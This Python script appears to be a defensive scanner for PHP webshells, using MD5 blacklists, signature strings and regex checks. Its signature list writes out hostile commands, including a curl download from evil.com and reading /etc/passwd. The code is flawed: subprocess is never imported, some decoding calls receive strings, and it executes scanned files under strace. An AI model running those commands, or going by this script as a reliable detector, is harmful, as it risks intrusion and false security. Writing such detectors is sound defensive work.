import os
import re
from concurrent.futures import ThreadPoolExecutor
import argparse
import zlib
import base64
import hashlib

def detect_webshell(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        content = file.read()  
        
        # Blacklist of known webshell signatures
        blacklist = ['GIF89a', 'eval(gzinflate(base64_decode', 'preg_replace("/.*/e",""', 'system("curl -O http://evil.com/backdoor.txt")', 'passthru("cat /etc/passwd")', 'file_put_contents(', 'base64_decode(', 'str_rot13(', 'assert($_', 'assert(`', 'exec($_', 'exec(`', 'system($_', 'system(`', 'eval($_', 'eval(`', 'preg_replace($_', 'preg_replace(`', 'create_function(', 'assert(0x',
             'assert(0b', # New signature 1
             '$_POST[', # New signature 2
            ]
        
        for signature in blacklist:
            if signature in content:
                return True, f'Contains known webshell signature "{signature}"'
        # System call-based checks
        try:
            output = subprocess.check_output(['strace', '-f', '-e', 'trace=all', '-o', '/dev/null', '--', 'php', file_path], stderr=subprocess.STDOUT)
            if re.search(rb'(chroot|setresuid|setreuid|setuid|setresgid|setregid|setgid|chmod|chown|ptrace|waitpid)', output):
                return True, 'Contains suspicious system call'
        except:
            pass
        # Behavior-based checks
            
        if re.search(r'<\?php\s*(\$[\w\d_]+)="";\s*\${"\x5f\x45\x52\x52\x4f\x52"}\[\${"\x5f\x45\x52\x52\x4f\x52"}\]="\x24\w+";\s*\${"\x5f\x45\x52\x52\x4f\x52"}\[\${"\x5f\x45\x52\x52\x4f\x52"}\+\+\]\.="\x24\w+";\s*\$[\w\d_]+="\x24\w+";\s*\$[\w\d_]+\(\$\w+\);\s*\?>'
, content):
            return True, ' XOR obfuscated file '


        # Common webshell signatures
        signatures = ['eval', 'exec', 'system', 'passthru', 'shell_exec', 'assert', 'preg_replace']
        for signature in signatures:
            if re.search(rf'\b{signature}\b', content, re.IGNORECASE):
                return True, f'Contains {signature} function'
        # Check for suspicious file names
        file_name = os.path.basename(file_path)
        if re.search(r'webshell|backdoor|cmd|shell|spy|remote|uploader', file_name, re.IGNORECASE):
            return True, 'Has suspicious file name'
        # Detect webshells using variable obfuscation
        if re.search(r'\$\w+\s*=\s*\$\w+;', content):
            return True, 'Contains variable obfuscation'

        # Detect webshells using function obfuscation
        if re.search(r'(function\s+\w+\s*\(|function\s*\([^\)]*\)\s*\{)\s*(eval|exec|system|passthru|shell_exec|assert|preg_replace)', content):
            return True, 'Contains function obfuscation'

        # Detect webshells using hex-encoded strings
        if re.search(r'(chr\(\d+\)\s*\.\s*){4,}', content):
            return True, 'Contains hex-encoded webshell'

        # Detect webshells using base64 encoding
        try:
            decoded_content = base64.b64decode(content)
            if re.search(r'(eval|exec|system|passthru|shell_exec|assert|preg_replace)', decoded_content.decode()):
                return True, 'Contains base64-encoded webshell'
        except:
            pass

        # Detect webshells using gzinflate and str_rot13
        try:
            decoded_content = zlib.decompress(content, 16+zlib.MAX_WBITS)
            decoded_content = decoded_content.decode('utf-8', errors='ignore')
            if re.search(r'(eval|exec|system|passthru|shell_exec|assert|preg_replace)', decoded_content):
                return True, 'Contains gzinflate/str_rot13-encoded webshell'
        except:
            pass

        # Detect webshells using PHP functions with base64 encoded strings
        if re.search(r'base64_decode\([\'"][^\'"]{200,}[\'"]\)', content):
            return True, 'Contains base64-encoded webshell'

        # Detect webshells using hex-encoded strings with pack() function
        if re.search(r'pack\([\'"]H[\'"],\s*[\'"][0-9a-fA-F]+[\'"]\)', content):
            return True, 'Contains hex-encoded webshell with pack() function'

        # Detect webshells using regex with base64 encoded strings
        if re.search(r'preg_replace\(\s*[\'"]/e[\'"]\s*,\s*\$.*,\s*[\'"](.+)[\'"]\s*\)', content, re.DOTALL):
            if re.search(r'base64_decode\([\'"]', content):
                return True, 'Contains regex-based webshell with base64-encoded strings'
         
         # Behavior-based checks
        if re.search(r'file_get_contents\(.*http', content) and re.search(r'eval\(.*file_get_contents\(.*http', content):
            return True, 'Downloads and executes additional malicious code'

        if re.search(r'\$_REQUEST', content) and re.search(r'eval\(\s*\$_REQUEST', content):
            return True, 'Executes arbitrary code via HTTP requests'

        if re.search(r'file_put_contents\(([^,]+),\s*(\$_|\'|")', content) or re.search(r'rename\((\$_|\'|"),\s*(\$_|\'|")', content):
            return True, 'Writes or renames files on the server'


        return False, None

def check_md5sum(file_path, blacklist_file='md5sum.txt'):
    with open(file_path, 'rb') as file:
        md5 = hashlib.md5(file.read()).hexdigest()
        with open(blacklist_file, 'r') as f:
            blacklistmd5 = f.read().splitlines()
        if md5 in blacklistmd5:
            return True, 'MD5 checksum is blacklisted of known webshell'
        else:
            return False, None



def scan_file(file_path):
    ext = os.path.splitext(file_path)[1]
    if os.path.getsize(file_path) > 100000000 or ext not in EXTENSIONS:
        return None
    print(f'Scanning {file_path}...')
    is_blacklisted, reason = check_md5sum(file_path)
    if is_blacklisted:
        return (file_path, reason)
    is_webshell, description = detect_webshell(file_path)
    if is_webshell:
        return (file_path, description)
    else:
        return None


def scan_directories(*directories):
    global EXTENSIONS
    EXTENSIONS = ['.png','.jpg','.php', '.php2', '.php3', '.php4', '.php5', '.php6', '.php7', '.phps', '.pht', '.phtm', '.phtml', '.pgif', '.shtml', '.htaccess', '.phar', '.inc', '.hphp', '.ctp', '.module','.png.php','.jpg.php','.php.png','.php.jpg','.phtml.png','.phtml.jpg','.jpg.phtml','.png.phtml']
    results = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        for directory in directories:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    future = executor.submit(scan_file, file_path)
                    results.append(future)
    return [result.result() for result in results if result.result()]


def generate_report(results):
    with open('webshell_report.txt', 'w') as file:
        if len(results) > 0:
            file.write('Webshells detected:\n')
            for result in results:
                file.write(f'{result[0]} - {result[1]}\n')
        else:
            file.write('No webshells detected.')




if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Run python3 webshelldetector.py /var/www/html\n to scan one path\n Run python3 webshell_detector.py /var/www/html /home/user/public_html ')
    parser.add_argument('directories', metavar='dir', type=str, nargs='+',
                        help='a directory to scan')
    args = parser.parse_args()

    results = scan_directories(*args.directories)
    generate_report(results)

